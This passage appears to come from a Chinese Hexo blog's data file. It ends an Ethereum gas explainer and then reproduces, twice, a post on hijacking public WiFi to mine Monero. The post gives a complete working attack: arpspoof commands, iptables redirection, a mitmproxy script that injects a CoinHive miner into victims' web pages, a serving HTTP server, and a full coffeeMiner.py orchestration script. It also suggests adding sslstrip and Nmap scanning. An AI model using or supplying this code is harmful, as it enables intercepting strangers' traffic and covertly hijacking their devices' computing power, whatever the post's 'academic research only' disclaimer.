limit</code>）</td>\n<td>如果交易发起人没有足够的以太币，则不会广播给矿工</td>\n</tr>\n</tbody>\n</table>\n<p>尽管提供了费用，但是一笔燃料很低的交易甚至可能不会到达矿工处。如果一笔交易提供了足够的燃料，但是费用很低，即使该交易到达矿工处，当矿工看到这个费用之后也不会对其进行计算处理。费用决定了交易将被打包进入区块的顺序。而提供高燃料会导致交易打包时间更长的原因在本文中 <em>高初始燃气可能会导致延迟</em> 部分。</p>\n<h2 id=\"初始燃气\"><a href=\"#初始燃气\" class=\"headerlink\" title=\"初始燃气\"></a>初始燃气</h2><p>让我们讨论一下交易开始时的燃料需求。抽象地说，在被允许使用世界计算机的计算和存储之前，世界计算机需要知道交易发起人是否有能力支付费用。具体地说，在处理交易之前，矿工需要知道自己是否可以获得报酬。一笔交易需要指定它愿意花费的最大燃料值。对于本文的目的来说，这个需求被称作初始燃气。初始燃气是交易的重要部分。不幸的是，不同的文档使用了不同的词来描述这个关键部分：</p>\n<ul>\n<li><a href=\"https://github.com/ethereum/wiki/wiki/White-Paper\" target=\"_blank\" rel=\"noopener\">以太坊白皮书</a>中使用了 初始燃气</li>\n<li><a href=\"https://github.com/ethereum/yellowpaper\" target=\"_blank\" rel=\"noopener\">以太坊黄皮书</a>中使用了燃料限制</li>\n<li><a href=\"https://github.com/ethereum/go-ethereum/releases\" target=\"_blank\" rel=\"noopener\">Geth</a> 和 <a href=\"https://github.com/ethereum/web3.js/releases\" target=\"_blank\" rel=\"noopener\">web3.js</a> 等软件中，简单地使用了 “燃气”。</li>\n</ul>\n<p>因为在通常情况下，不真正运行计算（关联 <a href=\"https://en.wikipedia.org/wiki/Halting_problem\" target=\"_blank\" rel=\"noopener\">停机问题</a>），矿工是不知道到底需要多少计算量的，所以初始燃气使事情变得更加简单（而不用 “燃气作为支付的消耗方式”（away from say a pay as gas is consumed approach） 这种说法）。作为一个以太坊应用的用户，必须提供初始燃气似乎很复杂，但开发人员可以使用一些工具来估计初始燃气并隐藏用户的详细信息。</p>\n<h2 id=\"燃料耗尽异常\"><a href=\"#燃料耗尽异常\" class=\"headerlink\" title=\"燃料耗尽异常\"></a>燃料耗尽异常</h2><p>一笔交易提供了它愿意消耗的最大燃料值。该燃气会被 EVM 中的每个操作消耗。如果燃料消耗完毕，而交易还未完成，那么一个燃料耗尽的异常就会发生。交易发起人为已经执行的操作支付，而交易也被打包进区块，但是所有的状态改变（比如合约的创建，值的存储，和<a href=\"https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e\" target=\"_blank\" rel=\"noopener\">日志</a>的写入）都会回滚。</p>\n<p>让我们还是使用第一个例子作为场景，但是这次交易发起人指定初始燃气为 90（而不是 150）。这里是执行的示意图：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>操作的燃料消耗</th>\n<th>剩余燃料</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>交易开始</td>\n<td></td>\n<td>90</td>\n</tr>\n<tr>\n<td>存储 31</td>\n<td>45</td>\n<td>45</td>\n</tr>\n<tr>\n<td>求和</td>\n<td>10</td>\n<td>35</td>\n</tr>\n<tr>\n<td>保存和</td>\n<td>45</td>\n<td>燃料耗尽</td>\n</tr>\n<tr>\n<td>交易结束</td>\n<td>因为燃料耗尽，存储的 31 会回滚</td>\n<td>耗尽</td>\n</tr>\n</tbody>\n</table>\n<p>在交易开始时，交易发起人需要拿出所有燃料的资金： 初始燃气 * 燃气价格 = 存放在柜台的以太币。柜台中的以太币数量为：</p>\n<p><strong>90 × 0.02µETH = 1.8µETH</strong></p>\n<p>当每个操作执行时，燃气会消耗，而在存储和时产生了燃料耗尽异常。这会导致所有的操作撤销，代表数字 31 会被回滚到它之前存储的值，但是交易依旧被打包进入区块链，而且矿工获得所有的酬金：1.8μ ETH。</p>\n<h2 id=\"燃气回退\"><a href=\"#燃气回退\" class=\"headerlink\" title=\"燃气回退\"></a>燃气回退</h2><p>EVM 中有两个负值燃气的操作：</p>\n<ul>\n<li>清空合约是 -24000</li>\n<li>清空存储是 -15000</li>\n</ul>\n<p>当 EVM 执行了这样的一个操作，它将被记录在单独的退款计数器中。燃气退款仅在交易结束时提供。 此外，最高返还金额等于一半已经消耗的燃气。</p>\n<p>一个关键点在于，一笔交易的燃料永远不会增加。当 EVM 执行操作时，燃料总是减少（当一些合约或者存储被清空，退款计数器会增加）。如果燃料到零或者负数，那么立马会产生一个燃料耗尽异常：退款计数器中有多少燃气并不重要。一笔交易为了能够使用燃气退款，它必须避免燃料耗尽异常。假设一笔交易有足够的燃气，然后它就能使用退款计数器中的燃气。</p>\n<p>退款的燃气值最多为消耗的燃气值的一半。例如，如果一笔交易使用了 60000 燃气，然后清空了 2 个合约而获得 48000 的一笔退款（每笔 24000），交易发起人还是需要支付给矿工 30000 燃气。这激励了矿工使用负值燃气操作处理交易，因为这给了他们收入，并确保了矿工不可能为他人的计算付款。</p>\n<h2 id=\"区块燃气限制（Block-gas-limit-BGL）\"><a href=\"#区块燃气限制（Block-gas-limit-BGL）\" class=\"headerlink\" title=\"区块燃气限制（Block gas limit:BGL）\"></a>区块燃气限制（Block gas limit:BGL）</h2><p>回顾一下，初始燃气由用户指定，是一笔交易将要消耗的燃料最大值。那么一个区块中能够容纳多少交易呢？答案是直到所有交易的初始燃气总和达到区块燃气限制（BGL）为止。当前(2016/6/23)的 BGL 是 4,712,388 （1.5π 的数字形式），表示能够在一个区块（平均出块时间 15 秒）中容纳 224 笔初始燃气为 21000 的交易。为了防止像比特币一样对区块是否变大产生分歧，以太坊协议允许矿工对自己的区块往任意方向进行 1/1024(0.0976%) 幅度的 BGL 调整。与协议不同的是默认的采矿策略，其最小 BGL 为 4,712,388。</p>\n<h2 id=\"高初始燃气可能存在的延迟\"><a href=\"#高初始燃气可能存在的延迟\" class=\"headerlink\" title=\"高初始燃气可能存在的延迟\"></a>高初始燃气可能存在的延迟</h2><p>既然燃料耗尽异常对交易发起人来说几乎是在浪费金钱，那么将初始燃气设置得更高总是更好的。所以，交易发起人为什么不总是将初始燃气指定为 4,000,000 呢？</p>\n<p>答案在于交易的初始燃气和它实际消耗的燃气之间的差异。矿工只会获得一笔交易实际消耗的燃气；所有未使用的燃气会被回退给交易发起人。</p>\n<p>如果同时存在一笔初始燃气为 4M 的交易和 100 笔初始燃气为 40,000 的交易，矿工可能会选择后者，因为这 100 笔交易的收入有更高的预测性。如果一笔初始燃气为 4M 的交易实际只消耗了 1M 燃气，那么矿工将损失 3M 的潜在燃气收入。所以，矿工更愿意优先考虑一些“小”交易，而不是拥有高初始燃气（除非<a href=\"https://github.com/ethereum/pyethereum/blob/3841e9a406f4ca9452afa45035fb07b5ce6314d9/ethereum/transactions.py#L177\" target=\"_blank\" rel=\"noopener\">内在气体</a>也十分高）的一笔交易。这会导致高初始燃气的交易在被打包之前存在延迟，并且也解释了过高的初始燃气可能会是有害的。</p>\n<h2 id=\"绕过交易所\"><a href=\"#绕过交易所\" class=\"headerlink\" title=\"绕过交易所\"></a>绕过交易所</h2><p>以太坊有两种类型的账户：</p>\n<ul>\n<li>用户账户（由私钥控制）</li>\n<li>合约（由代码控制）</li>\n</ul>\n<p>发送以太币到一个用户账户需要 21000 的燃气费用，而发送以太币到合约则需要更高的费用，这个费用取决于合约代码和交易中发送的数据。一些交易所会对他们所有的交易都只提供 21000 燃气，这表示在用户想要从交易所发送以太币到他们 Mist（以太坊钱包） 中的合约钱包时，交易会耗尽燃料，以太币永远也不会发送到用户的合约钱包。</p>\n<h2 id=\"计量和费用\"><a href=\"#计量和费用\" class=\"headerlink\" title=\"计量和费用\"></a>计量和费用</h2><p>关于计量和费用之间的区别还有一点需要注意。在比特币中，计量是根据字节来的：交易中的字节数。在以太坊中，计算也需要计量，因为少量的代码也可能被编码成永远执行。计量计算量也是使用燃气的一个原因。但是拥有燃气不代表需要费用。</p>\n<p>比如，在一个私链上，每个账户每天可以拥有 X 燃气，或者是每笔交易 Y 燃气，或者其他方案。另一方面，有费用不代表需要燃气：费用可以基于不同的计量，如字节。对于公有链上的安全性来说，燃气和费用两者都需要，而替代方案可能更适合私有链（比如，对于任何人都可以创建账户的公有链来说，每个账户每天有 X 燃气，可以被“女巫攻击”（Sybil-attacked））。</p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>燃气是使用世界计算机的计量方式和燃料，与使用世界计算机所支付的以太币费用是不同的。提供足够的燃料和足够的费用，两者之间是有区别的。运行时燃料耗尽会花费钱，而提供更多的燃气会使得更加安全，反正所有的未使用的燃气都会被回退。燃气是以太坊的核心部分，它的大多数话题已经被讨论过。这里有更多关于它的信息，包括<a href=\"https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethestimategas\" target=\"_blank\" rel=\"noopener\">估计燃气</a>，内在燃气（intrinsic gas），<a href=\"https://github.com/ethereum/go-ethereum/wiki/Gas-Price-Oracle\" target=\"_blank\" rel=\"noopener\">燃气价格预告（gas price oracle）</a>，<a href=\"https://ethereum.stackexchange.com/questions/1106/is-there-a-limit-for-transaction-size\" target=\"_blank\" rel=\"noopener\">交易大小的影响</a>，读者可以在本文的基础上进一步地探索和理解。</p>\n"},{"title":"劫持公共WIFI挖矿研究","comments":0,"date":"2018-03-09T08:10:09.000Z","img":null,"_content":"\n\n##警告:本篇文章和文章内提及的项目仅限于学术研究.\n\n这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.\n\n攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.\n\n![](/images/coffeeMiner-network-attack.png)\n\n正常WIFI网络配置:\n\nVictim:连接到路由器并浏览页面的机器\nAttacker:运行CoffeeMiner的机器,将执行MITM.\ngateway/router:正常的路由器\n\n![](/images/scenario01.png)\n\n一旦执行攻击,情况将是:\n\n![](/images/scenario02.png)\n\n攻击者要配置每台机器将执行以下配置：\n\nVictim:\n```\nip地址 : 10.0.2.10\n子网掩码 : 255.255.255.0\n默认网关:10.0.0.15\n```\nAttacker:\n```\nip地址 : 10.0.2.20\n子网掩码 : 255.255.255.0\n默认网关:10.0.0.15\n```\ngateway/router:\n```\n网络0设置dhcp自动获取.\n网络1:\nip地址 : 10.0.2.15\n子网掩码 : 255.255.255.0\n```\n\n## 1.CoffeeMiner的攻击代码\n### 1.1 ARP欺骗\n中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.\n简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.\n\n随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.\n最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.\n\n如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.\n\n所以要执行ARP欺骗攻击，我就将使用dsniff库.\n\n```python\narpspoof -i interface -t ipVictim ipGateway\narpspoof -i interface -t ipGateway ipVictim\n```\n## 1.2 mitmproxy\n\n需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.\n为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.\n注入挖矿代码的流程如下所示：\n```\n<script src=\"http://httpserverIP:8080/script.js\"></script>\n```\n## 1.3 注入器\n\n一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.\n\n```python\nfrom bs4 import BeautifulSoup\nfrom mitmproxy import ctx, http\nimport argparse\nclass Injector:\n    def __init__(self, path):\n        self.path = path\n    def response(self, flow: http.HTTPFlow) -> None:\n        if self.path:\n            html = BeautifulSoup(flow.response.content, \"html.parser\")\n            print(self.path)\n            print(flow.response.headers[\"content-type\"])\n            if flow.response.headers[\"content-type\"] == 'text/html':\n                script = html.new_tag(\n                    \"script\",\n                    src=self.path,\n                    type='application/javascript')\n                html.body.insert(0, script)\n                flow.response.content = str(html).encode(\"utf8\")\n                print(\"Script injected.\")\ndef start():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"path\", type=str)\n    args = parser.parse_args()\n    return Injector(args.path)\n```\n\n### 1.4 HTTP服务器\n\n正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.\n\n为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：\n```python\nimport http.server\nimport socketserver\nimport os\nPORT = 8000\nweb_dir = os.path.join(os.path.dirname(__file__), 'miner_script')\nos.chdir(web_dir)\nHandler = http.server.SimpleHTTPRequestHandler\nhttpd = socketserver.TCPServer((\"\", PORT), Handler)\nprint(\"serving at port\", PORT)\nhttpd.serve_forever()\n```\n\n上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.\nJavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.\n\n*Coinhive是一个提供恶意JS脚本的网站平台（https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.\n\n\n## 2.CoffeeMiner的运行\n\n在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。\n为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。\n\n```shell\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n```\n\n为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。\n```python\ngateway = sys.argv[1]\nprint(\"gateway: \" + gateway)\n# get victims_ip\nvictims = [line.rstrip('n') for line in open(\"victims.txt\")]\nprint(\"victims:\")\nprint(victims)\n# run the arpspoof for each victim, each one in a new console\nfor victim in victims:\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &\")\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &\")\n```\n\n一旦执行了ARP欺骗，只需要运行HTTP服务器即可.\n```python\n> python3 httpServer.py\n```\n现在，可以用injector.py运行mitmproxy了.\n\n```python\n> mitmdump -s 'injector.py http://httpserverIP:8080/script.js'\n```\n## 3.CoffeeMiner的最终挖矿脚本\n\n现在把上面解释的所有概念都放在'coffeeMiner.py'脚本中：\n```python\nimport os\nimport sys\n#get gateway_ip (router)\ngateway = sys.argv[1]\nprint(\"gateway: \" + gateway)\n# get victims_ip\nvictims = [line.rstrip('n') for line in open(\"victims.txt\")]\nprint(\"victims:\")\nprint(victims)\n# configure routing (IPTABLES)\nos.system(\"echo 1 > /proc/sys/net/ipv4/ip_forward\")\nos.system(\"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\")\nos.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\")\nos.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080\")\n# run the arpspoof for each victim, each one in a new console\nfor victim in victims:\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &\")\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &\")\n# start the http server for serving the script.js, in a new console\nos.system(\"xterm -hold -e 'python3 httpServer.py' &\")\n# start the mitmproxy\nos.system(\"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T\")\n```\n在'injector.py'脚本中：\n```python\nfrom bs4 import BeautifulSoup\nfrom mitmproxy import ctx, http\nimport argparse\nclass Injector:\n    def __init__(self, path):\n        self.path = path\n    def response(self, flow: http.HTTPFlow) -> None:\n        if self.path:\n            html = BeautifulSoup(flow.response.content, \"html.parser\")\n            print(self.path)\n            print(flow.response.headers[\"content-type\"])\n            if flow.response.headers[\"content-type\"] == 'text/html':\n                print(flow.response.headers[\"content-type\"])\n                script = html.new_tag(\n                    \"script\",\n                    src=self.path,\n                    type='application/javascript')\n                html.body.insert(0, script)\n                flow.response.content = str(html).encode(\"utf8\")\n                print(\"Script injected.\")\ndef start():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"path\", type=str)\n    args = parser.parse_args()\n    return Injector(args.path)\n```\n要执行挖矿，只需要执行以下操作：\n```python\n> python3 coffeeMiner.py RouterIP\n```\n\n当然也可以手动运行.\n\n![](/images/coffeeMiner-demo-cutted.gif)\n\n\n## 结论\n正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.\n\n另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.\n\n虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.\n\n附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner\n","source":"_posts/劫持公共WIFI挖矿研究.md","raw":"---\ntitle: 劫持公共WIFI挖矿研究\ncomments: false\ndate: 2018-03-09 16:10:09\ncategories: 矿池\ntags:\n- lucas556\n- 矿池\n- 门罗币\n- CoffeeMiner\n- MITM\n- CoinHive\nimg:\n---\n\n\n##警告:本篇文章和文章内提及的项目仅限于学术研究.\n\n这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.\n\n攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.\n\n![](/images/coffeeMiner-network-attack.png)\n\n正常WIFI网络配置:\n\nVictim:连接到路由器并浏览页面的机器\nAttacker:运行CoffeeMiner的机器,将执行MITM.\ngateway/router:正常的路由器\n\n![](/images/scenario01.png)\n\n一旦执行攻击,情况将是:\n\n![](/images/scenario02.png)\n\n攻击者要配置每台机器将执行以下配置：\n\nVictim:\n```\nip地址 : 10.0.2.10\n子网掩码 : 255.255.255.0\n默认网关:10.0.0.15\n```\nAttacker:\n```\nip地址 : 10.0.2.20\n子网掩码 : 255.255.255.0\n默认网关:10.0.0.15\n```\ngateway/router:\n```\n网络0设置dhcp自动获取.\n网络1:\nip地址 : 10.0.2.15\n子网掩码 : 255.255.255.0\n```\n\n## 1.CoffeeMiner的攻击代码\n### 1.1 ARP欺骗\n中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.\n简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.\n\n随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.\n最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.\n\n如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.\n\n所以要执行ARP欺骗攻击，我就将使用dsniff库.\n\n```python\narpspoof -i interface -t ipVictim ipGateway\narpspoof -i interface -t ipGateway ipVictim\n```\n## 1.2 mitmproxy\n\n需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.\n为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.\n注入挖矿代码的流程如下所示：\n```\n<script src=\"http://httpserverIP:8080/script.js\"></script>\n```\n## 1.3 注入器\n\n一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.\n\n```python\nfrom bs4 import BeautifulSoup\nfrom mitmproxy import ctx, http\nimport argparse\nclass Injector:\n    def __init__(self, path):\n        self.path = path\n    def response(self, flow: http.HTTPFlow) -> None:\n        if self.path:\n            html = BeautifulSoup(flow.response.content, \"html.parser\")\n            print(self.path)\n            print(flow.response.headers[\"content-type\"])\n            if flow.response.headers[\"content-type\"] == 'text/html':\n                script = html.new_tag(\n                    \"script\",\n                    src=self.path,\n                    type='application/javascript')\n                html.body.insert(0, script)\n                flow.response.content = str(html).encode(\"utf8\")\n                print(\"Script injected.\")\ndef start():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"path\", type=str)\n    args = parser.parse_args()\n    return Injector(args.path)\n```\n\n### 1.4 HTTP服务器\n\n正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.\n\n为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：\n```python\nimport http.server\nimport socketserver\nimport os\nPORT = 8000\nweb_dir = os.path.join(os.path.dirname(__file__), 'miner_script')\nos.chdir(web_dir)\nHandler = http.server.SimpleHTTPRequestHandler\nhttpd = socketserver.TCPServer((\"\", PORT), Handler)\nprint(\"serving at port\", PORT)\nhttpd.serve_forever()\n```\n\n上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.\nJavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.\n\n*Coinhive是一个提供恶意JS脚本的网站平台（https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.\n\n\n## 2.CoffeeMiner的运行\n\n在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。\n为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。\n\n```shell\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n```\n\n为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。\n```python\ngateway = sys.argv[1]\nprint(\"gateway: \" + gateway)\n# get victims_ip\nvictims = [line.rstrip('n') for line in open(\"victims.txt\")]\nprint(\"victims:\")\nprint(victims)\n# run the arpspoof for each victim, each one in a new console\nfor victim in victims:\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &\")\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &\")\n```\n\n一旦执行了ARP欺骗，只需要运行HTTP服务器即可.\n```python\n> python3 httpServer.py\n```\n现在，可以用injector.py运行mitmproxy了.\n\n```python\n> mitmdump -s 'injector.py http://httpserverIP:8080/script.js'\n```\n## 3.CoffeeMiner的最终挖矿脚本\n\n现在把上面解释的所有概念都放在'coffeeMiner.py'脚本中：\n```python\nimport os\nimport sys\n#get gateway_ip (router)\ngateway = sys.argv[1]\nprint(\"gateway: \" + gateway)\n# get victims_ip\nvictims = [line.rstrip('n') for line in open(\"victims.txt\")]\nprint(\"victims:\")\nprint(victims)\n# configure routing (IPTABLES)\nos.system(\"echo 1 > /proc/sys/net/ipv4/ip_forward\")\nos.system(\"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\")\nos.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\")\nos.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080\")\n# run the arpspoof for each victim, each one in a new console\nfor victim in victims:\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &\")\n    os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &\")\n# start the http server for serving the script.js, in a new console\nos.system(\"xterm -hold -e 'python3 httpServer.py' &\")\n# start the mitmproxy\nos.system(\"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T\")\n```\n在'injector.py'脚本中：\n```python\nfrom bs4 import BeautifulSoup\nfrom mitmproxy import ctx, http\nimport argparse\nclass Injector:\n    def __init__(self, path):\n        self.path = path\n    def response(self, flow: http.HTTPFlow) -> None:\n        if self.path:\n            html = BeautifulSoup(flow.response.content, \"html.parser\")\n            print(self.path)\n            print(flow.response.headers[\"content-type\"])\n            if flow.response.headers[\"content-type\"] == 'text/html':\n                print(flow.response.headers[\"content-type\"])\n                script = html.new_tag(\n                    \"script\",\n                    src=self.path,\n                    type='application/javascript')\n                html.body.insert(0, script)\n                flow.response.content = str(html).encode(\"utf8\")\n                print(\"Script injected.\")\ndef start():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"path\", type=str)\n    args = parser.parse_args()\n    return Injector(args.path)\n```\n要执行挖矿，只需要执行以下操作：\n```python\n> python3 coffeeMiner.py RouterIP\n```\n\n当然也可以手动运行.\n\n![](/images/coffeeMiner-demo-cutted.gif)\n\n\n## 结论\n正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.\n\n另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.\n\n虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.\n\n附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner\n","slug":"劫持公共WIFI挖矿研究","published":1,"updated":"2018-03-10T08:28:27.902Z","layout":"post","photos":[],"link":"","_id":"cjf7piavm000ypkwom8df87ov","content":"<p>##警告:本篇文章和文章内提及的项目仅限于学术研究.</p>\n<p>这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.</p>\n<p>攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.</p>\n<p><img src=\"/images/coffeeMiner-network-attack.png\" alt=\"\"></p>\n<p>正常WIFI网络配置:</p>\n<p>Victim:连接到路由器并浏览页面的机器<br>Attacker:运行CoffeeMiner的机器,将执行MITM.<br>gateway/router:正常的路由器</p>\n<p><img src=\"/images/scenario01.png\" alt=\"\"></p>\n<p>一旦执行攻击,情况将是:</p>\n<p><img src=\"/images/scenario02.png\" alt=\"\"></p>\n<p>攻击者要配置每台机器将执行以下配置：</p>\n<p>Victim:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip地址 : 10.0.2.10</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br><span class=\"line\">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>\n<p>Attacker:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip地址 : 10.0.2.20</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br><span class=\"line\">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>\n<p>gateway/router:<br><figure class=\"highlight 